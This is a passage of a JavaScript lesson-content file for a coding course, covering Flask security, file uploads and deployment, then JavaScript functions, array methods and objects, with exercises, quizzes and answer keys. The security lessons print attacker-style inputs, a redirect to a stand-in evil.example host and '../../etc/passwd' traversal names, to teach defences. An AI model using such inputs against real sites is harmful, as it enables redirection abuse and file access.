    ['h', "Passwords are never stored"],
    ['code', 'python', `from werkzeug.security import generate_password_hash, check_password_hash

hashed = generate_password_hash(password)          # store this
check_password_hash(hashed, attempt)               # True / False`],
    ['p', "Your `app.py` has `USERS = {\"itay\": \"1234\"}` — fine for a tutorial about sessions, fatal in anything real. A hash cannot be reversed, so a stolen database does not hand over the passwords. Never write your own hashing, and never use plain SHA-256: those are fast, and fast is exactly wrong here."],
    ['h', "Open redirects"],
    ['code', 'python', `# an attacker sends /login?next=https://evil.example
return redirect(request.args.get("next"))            # sends them there

from urllib.parse import urlparse
target = request.args.get("next", "")
if not target.startswith("/") or target.startswith("//"):
    target = url_for("index")
return redirect(target)`],
    ['p', "Only ever redirect to a path on your own site. `//evil.example` is a protocol-relative URL, which is why the second check is there."],
    ['h', "Path traversal"],
    ['code', 'python', `from werkzeug.utils import secure_filename

name = secure_filename(uploaded.filename)     # "../../etc/passwd" -> "etc_passwd"
path = os.path.join(UPLOAD_DIR, name)`],
    ['p', "This is the `os.path.join` trap from the os track, exploited deliberately: an absolute or `..`-laden name escapes the folder you meant."],
    ['h', "A short checklist"],
    ['ul', [
      "`debug=False` in production — the console runs arbitrary Python.",
      "`SECRET_KEY` from the environment, never a committed default.",
      "`SESSION_COOKIE_SECURE=True` behind HTTPS.",
      "Parameterised SQL, always.",
      "Validate on the server even when the browser already did.",
      "Keep dependencies updated — `pip list --outdated`."
    ]]
  ],
  ex: [
    { q: "Render a variable containing `<b>hi</b>` normally and with `|safe`. Then explain why `|safe` on user input is dangerous.",
      a: "Normally you see the literal text; with `|safe` it renders as bold. If that value came from a visitor, they could supply a script tag instead and run code in every other visitor's browser — reading cookies, making requests as them." },
    { q: "Describe, in request terms, how a CSRF attack works against a logged-in user.",
      a: "The victim is logged into your site, so their session cookie is stored. They visit another page that auto-submits a form to your URL. The browser attaches your cookie because cookies travel by destination, not by origin. Your server sees a valid, authenticated request — a token the attacker cannot know is what distinguishes it from a genuine one." },
    { q: "Replace `USERS = {\"itay\": \"1234\"}` with hashed passwords and rewrite the login check.",
      hint: "`werkzeug.security`.",
      a: "Note the stored value is the hash; the plaintext is never written anywhere.",
      code: ['python', `from werkzeug.security import generate_password_hash, check_password_hash

USERS = {"itay": generate_password_hash("1234")}

stored = USERS.get(username)
if stored and check_password_hash(stored, password):
    session["user"] = username`] },
    { q: "Make `redirect(request.args.get(\"next\"))` safe, and say why checking for a leading `/` is not enough on its own.",
      hint: "What does a URL beginning `//` mean?",
      a: "`//evil.example` starts with a slash but is protocol-relative — the browser reads it as an absolute URL to another host. You must reject `//` as well.",
      code: ['python', `target = request.args.get("next", "")
if not target.startswith("/") or target.startswith("//"):
    target = url_for("index")
return redirect(target)`] },
    { q: "Why is `secure_filename` needed even though you already use `os.path.join`?",
      a: "`os.path.join` is the vulnerability, not the protection: given an absolute path it discards everything before it, and it happily joins `../..` segments. `secure_filename` strips directory separators and traversal sequences first, so what reaches `join` cannot escape the upload folder." }
  ],
  quiz: [
    { q: "What does Jinja's autoescaping prevent?",
      opts: ["SQL injection", "Cross-site scripting", "CSRF", "Path traversal"], correct: 1,
      why: "It renders tags as visible text instead of markup. |safe switches that off — use it only on markup you generated." },
    { q: "Why does a CSRF attack work at all?",
      opts: ["Passwords are weak", "Cookies are sent based on destination, not on which page triggered the request", "HTTPS is missing", "Sessions never expire"], correct: 1,
      why: "The victim's cookie rides along automatically. A token the attacker cannot know is what separates real requests from forged ones." },
    { q: "How should passwords be stored?",
      opts: ["Plain text", "Encrypted so you can decrypt them", "Hashed with a slow algorithm", "Hashed with SHA-256"], correct: 2,
      why: "generate_password_hash uses a deliberately slow algorithm. Fast hashes like plain SHA-256 are brute-forced easily." },
    { q: "Why reject a `next` parameter starting with `//`?",
      opts: ["It is invalid", "It is protocol-relative — the browser treats it as another site", "It breaks url_for", "It doubles the slash"], correct: 1,
      why: "`//evil.example` passes a naive 'starts with /' check and still sends the visitor off-site." }
  ],
  fill: [
    { prompt: "Store a password so a stolen database is not a catastrophe.", lang: 'python',
      code: 'hashed = ___(password)', opts: ["hash", "generate_password_hash", "encrypt", "sha256"], correct: 1,
      why: "Hashing is one-way and deliberately slow." },
    { prompt: "Strip directory tricks from an uploaded name.", lang: 'python',
      code: 'name = ___(uploaded.filename)', opts: ["clean_name", "secure_filename", "basename", "escape"], correct: 1,
      why: "It removes separators and .. segments before the name reaches os.path.join." },
    { prompt: "Turn off the filter that stops XSS — only for your own markup.", lang: 'jinja',
      code: '{{ my_generated_html|___ }}', opts: ["raw", "safe", "html", "escape"], correct: 1,
      why: "Never apply it to anything a visitor typed." }
  ]
},

"flask:19": {
  blocks: [
    ['p', "Accepting a file is the route beginners most often get wrong, because three separate things must line up and two of them are invisible."],
    ['h', "The form encoding"],
    ['code', 'jinja', `<form method="post" enctype="multipart/form-data">
  <input type="file" name="photo">
  <button>Upload</button>
</form>`],
    ['warn', "Without `enctype=\"multipart/form-data\"` the browser sends only the **filename** as ordinary text. `request.files` is then empty and nothing errors — the classic “my upload is empty” bug. The default encoding cannot carry binary data."],
    ['h', "Reading it"],
    ['code', 'python', `import os
from werkzeug.utils import secure_filename

UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
ALLOWED = {".png", ".jpg", ".jpeg", ".gif", ".pdf"}

@app.route("/upload", methods=["POST"])
def upload():
    uploaded = request.files.get("photo")
    if uploaded is None or uploaded.filename == "":
        flash("Choose a file first.", "error")
        return redirect(url_for("index"))

    name = secure_filename(uploaded.filename)
    ext = os.path.splitext(name)[1].lower()
    if ext not in ALLOWED:
        flash("That file type is not allowed.", "error")
        return redirect(url_for("index"))

    os.makedirs(UPLOAD_DIR, exist_ok=True)
    uploaded.save(os.path.join(UPLOAD_DIR, name))
    flash("Uploaded " + name, "success")
    return redirect(url_for("index"))`],
    ['p', "Note `uploaded.filename == \"\"` — submitting the form with nothing chosen still produces a `FileStorage` object, just an empty one."],
    ['h', "Never trust the name"],
    ['code', 'python', `secure_filename("../../hello.py")     # 'hello.py'
secure_filename("C:\\\\Windows\\\\x.dll")  # 'Windows_x.dll'
secure_filename("שלום.png")            # 'png'   <- watch out`],
    ['warn', "`secure_filename` strips non-ASCII entirely, so a Hebrew filename can reduce to almost nothing — or to an empty string, which then collides with everything. Generate your own name and keep the original only as a label."],
    ['code', 'python', `import uuid

ext = os.path.splitext(secure_filename(uploaded.filename))[1].lower()
stored_name = uuid.uuid4().hex + ext          # 'f3a9...c1.png'`],
    ['h', "Size limits"],
    ['code', 'python', `app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024      # 5 MB

@app.errorhandler(413)
def too_large(err):
    return "That file is too big (5 MB max).", 413`],
    ['p', "Without a limit, one request can fill your disk. Flask rejects anything larger before your view runs, with a `413`."],
    ['h', "Where files should live"],
    ['ul', [
      "**Not** in `static/` — everything there is public to anyone who guesses the URL.",
      "In a folder outside the web root, served through a view that checks permissions.",
      "In object storage (S3 and similar) once you have more than one server."
    ]],
    ['code', 'python', `from flask import send_from_directory

@app.route("/uploads/<name>")
def serve_upload(name):
    return send_from_directory(UPLOAD_DIR, secure_filename(name))`],
    ['note', "`send_from_directory` refuses paths that escape the folder you named — so it is safe even if `name` is hostile. That is exactly the guarantee `open(os.path.join(...))` does not give you."],
    ['h', "An extension is not proof"],
    ['p', "Renaming `evil.exe` to `photo.png` takes one second. Checking the extension stops honest mistakes, not attacks. If it matters, verify the content — read the first bytes, or use a library like Pillow to confirm an image really opens."]
  ],
  ex: [
    { q: "Build an upload form and route. Then remove `enctype` and submit again — what does `request.files` contain?",
      hint: "Print it in both cases.",
      a: "With the enctype you get a `FileStorage`. Without it `request.files` is empty and the filename turns up in `request.form` as plain text. Nothing raises, which is what makes it so confusing." },
    { q: "Submit the form with no file selected. Why is checking `uploaded is None` not enough?",
      a: "The browser still sends the field, so you get a `FileStorage` whose `filename` is `\"\"`. You must check both — `uploaded is None or uploaded.filename == \"\"`." },
    { q: "Predict `secure_filename(\"../../hello.py\")` and `secure_filename(\"שלום.png\")`, then run them.",
      hint: "One of them loses almost everything.",
      a: "`'hello.py'` and `'png'`. Non-ASCII is stripped entirely, so a Hebrew name can collapse to just the extension — or to an empty string. Generate your own storage name with `uuid4().hex` and keep the original as a display label only." },
    { q: "Add a 2 MB limit and a 413 handler. What happens to a larger upload?",
      hint: "`MAX_CONTENT_LENGTH`.",
      a: "Flask aborts the request before your view runs, so the file never reaches disk and never occupies memory.",
      code: ['python', `app.config["MAX_CONTENT_LENGTH"] = 2 * 1024 * 1024

@app.errorhandler(413)
def too_large(err):
    return "Too big — 2 MB maximum.", 413`] },
    { q: "Why serve uploads through `send_from_directory` rather than saving them into `static/`?",
      a: "Everything in `static/` is public and unauthenticated — anyone who guesses a URL can download it, which is wrong for anything private. A view lets you check who is asking first. `send_from_directory` also refuses paths that escape the folder, so a hostile filename cannot walk up into your source code." }
  ],
  quiz: [
    { q: "`request.files` is empty even though a file was chosen. Most likely cause?",
      opts: ["The file is too big", "The form lacks enctype=\"multipart/form-data\"", "Wrong method", "Missing MAX_CONTENT_LENGTH"], correct: 1,
      why: "The default encoding cannot carry binary, so only the filename is sent — as ordinary form text." },
    { q: "What does `secure_filename` do to a Hebrew filename?",
      opts: ["Keeps it", "Strips the non-ASCII, possibly leaving almost nothing", "Raises", "Base64-encodes it"], correct: 1,
      why: "It can reduce to just the extension. Generate your own name and keep the original as a label." },
    { q: "What does `MAX_CONTENT_LENGTH` protect against?",
      opts: ["Wrong file types", "One request filling your disk or memory", "Path traversal", "CSRF"], correct: 1,
      why: "Flask rejects oversized requests with 413 before your view runs." },
    { q: "Why not save uploads into `static/`?",
      opts: ["It is slower", "Everything there is publicly downloadable", "Flask forbids it", "Templates cannot reach it"], correct: 1,
      why: "No authentication is possible. Serve through a view with send_from_directory instead." }
  ],
  fill: [
    { prompt: "Let the form carry a file at all.", lang: 'html',
      code: '<form method="post" ___="multipart/form-data">', opts: ["type", "enctype", "encoding", "accept"], correct: 1,
      why: "The default encoding sends only the filename as text." },
    { prompt: "Get the uploaded file.", lang: 'python',
      code: 'uploaded = request.___.get("photo")', opts: ["form", "files", "args", "data"], correct: 1,
      why: "form holds text fields; files holds FileStorage objects." },
    { prompt: "Cap the request size.", lang: 'python',
      code: 'app.config["___"] = 5 * 1024 * 1024', opts: ["MAX_UPLOAD_SIZE", "MAX_CONTENT_LENGTH", "UPLOAD_LIMIT", "MAX_FILE_SIZE"], correct: 1,
      why: "Flask rejects anything larger with 413, before your view runs." }
  ]
},

"flask:20": {
  blocks: [
    ['p', "`app.run()` prints a warning every time you start it, and the warning is accurate. Here is what it means and what replaces it."],
    ['code', 'shell', `WARNING: This is a development server. Do not use it in a
production deployment. Use a production WSGI server instead.`],
    ['h', "Why the dev server is not enough"],
    ['ul', [
      "It handles requests largely one at a time — one slow response blocks everyone.",
      "No process management: an unhandled crash takes the whole site down.",
      "It has not been hardened against malformed or malicious requests.",
      "With `debug=True` it exposes a console that executes Python for anyone who can reach the page."
    ]],
    ['h', "WSGI: the plug between server and app"],
    ['p', "WSGI is a calling convention. Your app is a callable that receives a request environment and returns a response; a WSGI server speaks HTTP on one side and that convention on the other. Flask implements it, which is why any WSGI server can run your app unchanged."],
    ['code', 'shell', `# Windows
pip install waitress
waitress-serve --port=8000 hello:app

# Linux / macOS
pip install gunicorn
gunicorn --workers 4 --bind 127.0.0.1:8000 hello:app`],
    ['p', "`hello:app` means “the object called `app` in the module `hello`”. With a factory: `\"app:create_app()\"`."],
    ['note', "Notice `app.run()` is never called. In production the server imports your app and drives it — which is exactly why the `if __name__ == \"__main__\"` guard matters."],
    ['h', "A reverse proxy in front"],
    ['code', 'text', `internet  ->  nginx  ->  waitress/gunicorn  ->  your Flask app
              (443)      (127.0.0.1:8000)`],
    ['ul', [
      "Terminates HTTPS, so certificates are handled in one place.",
      "Serves `static/` directly, far faster than Python can.",
      "Absorbs slow clients, so a worker is never tied up by a bad connection.",
      "Lets you run several apps on one machine."
    ]],
    ['h', "Configuration for production"],
    ['code', 'python', `app.config.update(
    DEBUG=False,
    SESSION_COOKIE_SECURE=True,       # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PREFERRED_URL_SCHEME="https",
)`],
    ['h', "Logging"],
    ['p', "`print()` goes nowhere useful once a process manager owns stdout. Use the logger, which carries levels and timestamps:"],
    ['code', 'python', `import logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)

app.logger.info("started")
app.logger.exception("this one includes the traceback")`],
    ['p', "This is where your `logs/app.log` habit graduates: same idea, but with levels, timestamps and rotation handled for you."],
    ['h', "Before you deploy"],
    ['tbl',
      ["Check", "Why"],
      [
        ["`debug=False`", "the console executes arbitrary Python"],
        ["`SECRET_KEY` from the environment", "a committed key lets anyone forge sessions"],
        ["A real WSGI server", "concurrency and robustness"],
        ["HTTPS, with `SESSION_COOKIE_SECURE`", "cookies must not cross the network in the clear"],
        ["Dependencies pinned", "`pip freeze > requirements.txt` so the deploy is reproducible"],
        ["The database is backed up", "and you have restored from it at least once"],
        ["Errors go somewhere you look", "a log nobody reads is not monitoring"]
      ]
    ],
    ['h', "Where to put it"],
    ['ul', [
      "**A platform** — Render, Railway, Fly.io, PythonAnywhere. They provide the WSGI server, HTTPS and a secrets store. Start here.",
      "**A container** — a `Dockerfile` running gunicorn, deployable anywhere.",
      "**A virtual machine** — nginx plus systemd, most control and most upkeep."
    ]]
  ],
  ex: [
    { q: "Install waitress and serve `hello:app` on port 8000. What does `hello:app` mean, and why is `app.run()` never called?",
      hint: "module colon variable.",
      a: "It names the module and the callable inside it. The WSGI server imports your module and calls the app itself, so `app.run()` — guarded by `if __name__ == \"__main__\"` — never fires. That guard is what makes the same file work both ways.",
      code: ['shell', `pip install waitress
waitress-serve --port=8000 hello:app`] },
    { q: "Name three concrete things the dev server does badly that a WSGI server does well.",
      a: "Concurrency (the dev server largely serialises requests), resilience (no worker restart after a crash), and hardening against malformed requests. A fourth: it has no process manager, so nothing brings it back up." },
    { q: "List four things a reverse proxy does that your Flask app should not.",
      a: "Terminate HTTPS, serve static files, buffer slow clients so a worker is not held open, and route several apps or domains on one machine. Each is something nginx does in C far better than Python can." },
    { q: "Replace a `print()` in a route with `app.logger.info()`. Why does it matter in production?",
      hint: "Who owns stdout once a process manager is running?",
      a: "`print` has no level, no timestamp and no source, and its destination depends entirely on how the process was started. The logger gives you all three and can be routed to a file, a service, or rotated — and `app.logger.exception()` includes the traceback automatically." },
    { q: "Write your own deployment checklist for this project, and say which item you would check first.",
      a: "`debug=False` first — everything else is a degradation, while a public debug console is a full remote-code-execution hole. Then `SECRET_KEY` from the environment, a real WSGI server, HTTPS with secure cookies, pinned dependencies, backups you have actually restored, and errors somewhere you will look." }
  ],
  quiz: [
    { q: "What is WSGI?",
      opts: ["A web server", "A calling convention between servers and Python apps", "A Flask extension", "A deployment platform"], correct: 1,
      why: "Flask implements it, so any WSGI server — waitress, gunicorn, uWSGI — can run your app unchanged." },
    { q: "In `waitress-serve hello:app`, what is `app`?",
      opts: ["The filename", "The Flask object inside module hello", "A route", "The port"], correct: 1,
      why: "module:callable. The server imports it and drives it, so app.run() is never called." },
    { q: "Which is the most dangerous thing to leave on in production?",
      opts: ["TESTING", "debug=True", "A log file", "SameSite=Lax"], correct: 1,
      why: "The interactive debugger executes arbitrary Python for anyone who can reach the page." },
    { q: "Why put nginx in front of gunicorn?",
      opts: ["Python cannot speak HTTP", "It handles HTTPS, static files and slow clients far better", "Flask requires it", "To enable sessions"], correct: 1,
      why: "Each of those is work you do not want occupying an application worker." }
  ],
  fill: [
    { prompt: "Serve the app with a production server on Windows.", lang: 'shell',
      code: '___-serve --port=8000 hello:app', opts: ["flask", "waitress", "gunicorn", "python"], correct: 1,
      why: "waitress is the usual choice on Windows; gunicorn does not run there." },
    { prompt: "Only send the session cookie over HTTPS.", lang: 'python',
      code: 'app.config["SESSION_COOKIE____"] = True', opts: ["HTTPONLY", "SECURE", "SAMESITE", "SIGNED"], correct: 1,
      why: "Secure means the browser withholds it on plain http." },
    { prompt: "Log an error with its traceback.", lang: 'python',
      code: 'app.logger.___("payment failed")', opts: ["info", "error", "exception", "warn"], correct: 2,
      why: "exception() attaches the current traceback; error() does not." }
  ]
}

};

/* ═══════════════════════════════════════════════════════════
   Completes the JavaScript track.
   ═══════════════════════════════════════════════════════════ */
LESSON_CONTENT_2["js:6"] = {
  blocks: [
    ['p', "Four ways to write a function. They differ in when they exist, what `this` means inside them, and how much punctuation they need."],
    ['code', 'js', `function greet(name) { return "hi " + name; }        // declaration
const greet2 = function (name) { return "hi " + name; };  // expression
const greet3 = (name) => { return "hi " + name; };        // arrow
const greet4 = name => "hi " + name;                      // arrow, implicit return`],
    ['h', "Hoisting"],
    ['p', "A **declaration** is available before its line runs. An expression assigned to `const` is not:"],
    ['lab', 'js', `console.log(declared(2));      // works

try { console.log(assigned(2)); }
catch (e) { console.log(e.name + ":", e.message); }

function declared(n) { return n * 2; }
const assigned = n => n * 2;`],
    ['h', "Arrows: the short forms"],
    ['code', 'js', `n => n * 2                 // one parameter, one expression
(a, b) => a + b            // two parameters
() => 42                   // none
n => ({ value: n })        // returning an object needs parentheses`],
    ['warn', "`n => { value: n }` returns `undefined`. The braces are read as a function body, and `value:` as a label. Wrap the object in parentheses."],
    ['h', "Defaults and rest"],
    ['code', 'js', `function greet(name = "stranger", greeting = "shalom") {
  return greeting + " " + name;
}

function sum(...numbers) {          // gathers the rest into a real array
  return numbers.reduce((a, b) => a + b, 0);
}
sum(1, 2, 3);                       // 6`],
    ['p', "`...numbers` is Python's `*args`. Unlike the old `arguments` object it is a genuine array, so `map` and `reduce` work on it."],
    ['h', "Functions are values"],
    ['code', 'js', `const ops = { double: n => n * 2, square: n => n * n };
[1, 2, 3].map(ops.double);          // [2, 4, 6]

function twice(fn, value) { return fn(fn(value)); }
twice(ops.double, 5);               // 20`],
    ['p', "Passing functions around is how `map`, `filter` and every event handler work — the next several lessons all rest on this."]
  ],
  ex: [
    { q: "Write `greet` as a declaration and as an arrow with an implicit return.",
      a: "The arrow drops `function`, `return` and the braces. Use it for short transformations; a declaration reads better for anything with real logic.",
      code: ['js', `function greet(name) { return "shalom " + name; }
const greet2 = name => "shalom " + name;`] },
    { q: "Run the hoisting lab. Why does one call work and the other throw?",
      a: "Function declarations are hoisted complete, so `declared` exists from the top of the scope. `const assigned` is hoisted but uninitialised — the temporal dead zone — so calling it raises `ReferenceError: Cannot access 'assigned' before initialization`." },
    { q: "Predict `const make = n => { value: n }; make(5)`. Fix it.",
      hint: "What are the braces?",
      a: "`undefined` — the braces are a function body with a label, not an object literal. Wrap it: `n => ({ value: n })`." },
    { q: "Write `sum(...numbers)` returning the total of any number of arguments.",
      a: "The `0` seed matters: `reduce` on an empty array with no initial value throws.",
      code: ['js', `const sum = (...numbers) => numbers.reduce((a, b) => a + b, 0);
console.log(sum(), sum(1, 2, 3));   // 0 6`] },
    { q: "Write `applyTwice(fn, value)` and use it with an arrow. Why is this possible in JavaScript?",
      a: "Functions are ordinary values — assignable, passable, storable in objects and arrays. That single fact is what makes `map`, `filter` and `addEventListener` possible.",
      code: ['js', `const applyTwice = (fn, value) => fn(fn(value));
applyTwice(n => n * 3, 2);          // 18`] }
  ],
  quiz: [
    { q: "Which can be called before the line that defines it?",
      opts: ["An arrow assigned to const", "A function declaration", "Both", "Neither"], correct: 1,
      why: "Declarations are hoisted complete; const bindings sit in the temporal dead zone until their line runs." },
    { q: "What does `n => { value: n }` return?",
      opts: ["An object", "undefined", "A syntax error", "The number"], correct: 1,
      why: "The braces are a function body. Wrap the object in parentheses: `n => ({ value: n })`." },
    { q: "What is `...args` in a parameter list?",
      opts: ["Spread of an array", "Rest — gathers remaining arguments into a real array", "Optional arguments", "A type hint"], correct: 1,
      why: "Python's *args, but a genuine array, so map and reduce work directly." },
    { q: "Why can you pass a function to `map`?",
      opts: ["map is special", "Functions are values, like numbers and strings", "It uses eval", "Only named functions work"], correct: 1,
      why: "Everything from callbacks to event handlers depends on this." }
  ],
  fill: [
    { prompt: "Return an object from an arrow.", lang: 'js',
      code: 'const make = n => ___;', opts: ["{ value: n }", "({ value: n })", "[value: n]", "return { value: n }"], correct: 1,
      why: "Without the wrapping parentheses the braces are read as a function body." },
    { prompt: "Collect any number of arguments.", lang: 'js',
      code: 'function sum(___numbers) { }', opts: ["*", "...", "&", "@"], correct: 1,
      why: "Rest parameters gather the remaining arguments into an array." },
    { prompt: "Give a parameter a fallback.", lang: 'js',
      code: 'function greet(name ___ "stranger") { }', opts: ["=", ":", "??", "||"], correct: 0,
      why: "Default parameters use plain assignment in the signature." }
  ]
};

LESSON_CONTENT_2["js:7"] = {
  blocks: [
    ['p', "Array methods are where JavaScript stops looking like Python and starts being pleasant. Three of them cover most work."],
    ['h', "map, filter, reduce"],
    ['code', 'js', `const nums = [1, 2, 3, 4, 5];

nums.map(n => n * 2);                  // [2,4,6,8,10]   same length, new values
nums.filter(n => n % 2 === 0);         // [2,4]          fewer, same values
nums.reduce((total, n) => total + n, 0);  // 15          one value out`],
    ['tbl',
      ["Method", "Returns", "Use when"],
      [
        ["`map`", "a new array, same length", "transforming every item"],
        ["`filter`", "a new array, fewer items", "keeping some"],
        ["`reduce`", "a single value", "folding down to one thing"],
        ["`find`", "the first match, or `undefined`", "looking one up"],
        ["`some` / `every`", "a boolean", "asking a question"],
        ["`forEach`", "`undefined`", "side effects only"]
      ]
    ],
    ['lab', 'js', `const tasks = [
  { title: "learn routes", done: true },
  { title: "learn Jinja",  done: true },
  { title: "learn fetch",  done: false },
];

console.log(tasks.filter(t => !t.done).map(t => t.title));
console.log("done:", tasks.filter(t => t.done).length, "of", tasks.length);
console.log("any left?", tasks.some(t => !t.done));
console.log("all done?", tasks.every(t => t.done));`],
    ['h', "Mutating versus returning"],
    ['warn', "This is the distinction that causes real bugs. Some methods change the array in place and some return a new one — and `sort` and `reverse` do **both**, which surprises people."],
    ['tbl',
      ["Changes the original", "Returns a new array"],
      [
        ["`push`, `pop`, `shift`, `unshift`", "`map`, `filter`, `slice`, `concat`"],
        ["`splice`, `sort`, `reverse`, `fill`", "`toSorted`, `toReversed`, `with`"]
      ]
    ],
    ['code', 'js', `const original = [3, 1, 2];
const sorted = original.sort();     // sorted IS original, now reordered
original;                           // [1,2,3] — the original changed

const safe = [...original].sort();  // copy first
const modern = original.toSorted(); // newer browsers`],
    ['h', "Sorting is by string by default"],
    ['code', 'js', `[10, 9, 100].sort();               // [10, 100, 9]   compared as text
[10, 9, 100].sort((a, b) => a - b); // [9, 10, 100]`],
    ['h', "Spread"],
    ['code', 'js', `const copy = [...nums];             // shallow copy
const joined = [...a, ...b];        // concatenate
Math.max(...nums);                  // spread into arguments`]
  ],
  ex: [
    { q: "From an array of task objects, get the titles of the unfinished ones.",
      a: "Filter narrows, map transforms — chained left to right.",
      code: ['js', `tasks.filter(t => !t.done).map(t => t.title);`] },
    { q: "Predict `[10, 9, 100].sort()`, then fix it.",
      hint: "What does sort compare by default?",
      a: "`[10, 100, 9]` — items are converted to strings and compared character by character, so `\"100\" < \"9\"`. Pass a comparator: `sort((a, b) => a - b)`." },
    { q: "Why does `const sorted = arr.sort()` also change `arr`?",
      a: "`sort` sorts in place and returns the *same* array, so both names point at one object. Copy first with `[...arr].sort()`, or use `toSorted()`." },
    { q: "Total the `price` of every item with `reduce`. What happens without the `0`?",
      hint: "The seed is the second argument.",
      a: "Without a seed, `reduce` uses the first element as the starting accumulator — which is an object here, so you get `\"[object Object]12\"`. On an empty array it throws `TypeError`.",
      code: ['js', `items.reduce((total, item) => total + item.price, 0);`] },
    { q: "When is `forEach` the wrong choice?",
      a: "Whenever you want a result — it always returns `undefined`, so `const x = arr.forEach(...)` is always `undefined`. It also cannot `break`. Use `map`/`filter`/`reduce` to produce values, and `for...of` when you need early exit." }
  ],
  quiz: [
    { q: "What does `map` return?",
      opts: ["The original array", "A new array of the same length", "A single value", "undefined"], correct: 1,
      why: "filter returns fewer items, reduce returns one value, forEach returns undefined." },
    { q: "`[10, 9, 100].sort()` gives…",
      opts: ["[9,10,100]", "[10,100,9]", "[100,10,9]", "an error"], correct: 1,
      why: "Default sort compares stringified values. Pass (a,b) => a - b for numbers." },
    { q: "Which pair mutates the array in place?",
      opts: ["map and filter", "slice and concat", "sort and reverse", "find and some"], correct: 2,
      why: "They also return the same array, which hides the mutation behind an innocent-looking assignment." },
    { q: "Why give `reduce` a starting value?",
      opts: ["Style", "Without it the first element becomes the accumulator, and an empty array throws", "It is required", "It speeds it up"], correct: 1,
      why: "reduce((a,b)=>a+b, 0) is safe on an empty array; without the 0 it raises TypeError." }
  ],
  fill: [
    { prompt: "Keep only the unfinished tasks.", lang: 'js',
      code: 'tasks.___(t => !t.done)', opts: ["map", "filter", "find", "some"], correct: 1,
      why: "filter keeps items matching the test; map transforms every item." },
    { prompt: "Sort numbers correctly.", lang: 'js',
      code: 'nums.sort((a, b) => ___)', opts: ["a > b", "a - b", "a, b", "b"], correct: 1,
      why: "The comparator must return a negative, zero or positive number." },
    { prompt: "Copy before sorting so the original survives.", lang: 'js',
      code: 'const sorted = [___nums].sort();', opts: ["*", "...", "&", "@"], correct: 1,
      why: "Spread makes a shallow copy; sort would otherwise reorder the original." }
  ]
};

LESSON_CONTENT_2["js:8"] = {
  blocks: [
    ['p', "An object is JavaScript's dict — but with syntax that makes pulling values out of it far shorter than Python's."],
    ['code', 'js', `const user = { name: "Itay", age: 25, hobbies: ["coding"] };

user.name;            // dot access
user["name"];         // bracket access
user[key];            // bracket is required when the key is in a variable
user.missing;         // undefined, not an error`],
    ['h', "Building them"],
    ['code', 'js', `const name = "Itay", age = 25;
const user = { name, age };            // shorthand for { name: name, age: age }

const field = "score";
const scores = { [field]: 10 };        // computed key -> { score: 10 }`],
    ['h', "Destructuring"],
    ['code', 'js', `const { name, age } = user;                    // two variables
const { name: who } = user;                    // rename
const { city = "unknown" } = user.address ?? {};   // default
const { name, ...rest } = user;                // rest gets everything else

const [first, second] = [10, 20];              // arrays too
const [, third] = [1, 2, 3];                   // skip with a hole`],
    ['p', "It works in parameter lists, which is how most libraries take options:"],
    ['code', 'js', `function draw({ x = 0, y = 0, colour = "black" } = {}) {
  console.log(x, y, colour);
}
draw({ x: 10, colour: "teal" });     // 10 0 teal
draw();                              // 0 0 black`],
    ['note', "The trailing `= {}` is what lets you call `draw()` with nothing. Without it, destructuring `undefined` throws."],
    ['h', "Iterating"],
    ['lab', 'js', `const user = { name: "Itay", age: 25, city: "Tel Aviv" };

console.log(Object.keys(user));
console.log(Object.values(user));

for (const [key, value] of Object.entries(user)) {
  console.log(key, "=", value);
}`],
    ['h', "Copies are shallow"],
    ['code', 'js', `const copy = { ...user };            // new top level
copy.name = "Someone";              // does not affect user
copy.hobbies.push("reading");       // DOES affect user — same array

const deep = structuredClone(user); // genuinely independent`],
    ['warn', "Spread copies one level. Nested objects and arrays are still shared, which is the source of a great many “why did that change?” bugs."]
  ],
  ex: [
    { q: "Pull `name` and `age` out of an object in one line, renaming `name` to `who`.",
      a: "The colon in destructuring means “rename”, not “type”.",
      code: ['js', `const { name: who, age } = user;`] },
    { q: "When must you use `user[key]` rather than `user.key`?",
      a: "When the key is held in a variable, or is not a valid identifier — `user[\"first name\"]`. `user.key` looks for a property literally called `key`." },
    { q: "Write `draw({x, y, colour})` with defaults that can also be called with no arguments at all.",
      hint: "Two levels of default.",
      a: "Without `= {}` the call `draw()` throws, because you cannot destructure `undefined`.",
      code: ['js', `function draw({ x = 0, y = 0, colour = "black" } = {}) {
  return \`\${x},\${y} \${colour}\`;
}`] },
    { q: "Loop over an object printing `key = value`.",
      hint: "`Object.entries` plus destructuring.",
      a: "`for...in` also works but walks inherited properties too, so `Object.entries` is safer and reads better.",
      code: ['js', `for (const [key, value] of Object.entries(user)) {
  console.log(key, "=", value);
}`] },
    { q: "`const copy = {...user}` then `copy.hobbies.push(\"x\")` changes `user` too. Why, and what fixes it?",
      a: "Spread copies the top level only, so `copy.hobbies` and `user.hobbies` are the same array object. Use `structuredClone(user)` for a genuinely independent copy, or copy the nested parts explicitly." }
  ],
  quiz: [
    { q: "Reading a property that does not exist gives…",
      opts: ["An error", "null", "undefined", "an empty string"], correct: 2,
      why: "Unlike a Python dict, which raises KeyError. Optional chaining helps when the parent may be missing too." },
    { q: "What does `const { name: who } = user` do?",
      opts: ["Type annotation", "Creates a variable `who` from `user.name`", "Creates both name and who", "Syntax error"], correct: 1,
      why: "The colon renames during destructuring." },
    { q: "Why the trailing `= {}` in `function f({ a = 1 } = {})`?",
      opts: ["Style", "So calling f() with no arguments does not throw", "To freeze the object", "It is required by arrows"], correct: 1,
      why: "Destructuring undefined throws; the default gives it an empty object to destructure." },
    { q: "`{...user}` copies…",
      opts: ["Everything, deeply", "Only the top level — nested objects stay shared", "Only strings", "Nothing"], correct: 1,
      why: "structuredClone gives a genuinely independent copy." }
  ],
  fill: [
    { prompt: "Read a property whose name is in a variable.", lang: 'js',
      code: 'const value = user___;', opts: [".key", "[key]", "->key", '."key"'], correct: 1,
      why: "Dot access looks for a property literally named key." },
    { prompt: "Pull two fields out in one statement.", lang: 'js',
      code: 'const ___ = user;', opts: ["{ name, age }", "[name, age]", "(name, age)", "name, age"], correct: 0,
      why: "Braces destructure objects; brackets destructure arrays." },
    { prompt: "Get key/value pairs to loop over.", lang: 'js',
      code: 'for (const [k, v] of Object.___(user))', opts: ["keys", "values", "entries", "pairs"], correct: 2,
      why: "entries() yields [key, value] arrays, destructured in the loop head." }
  ]
};

LESSON_CONTENT_2["js:9"] = {
  blocks: [
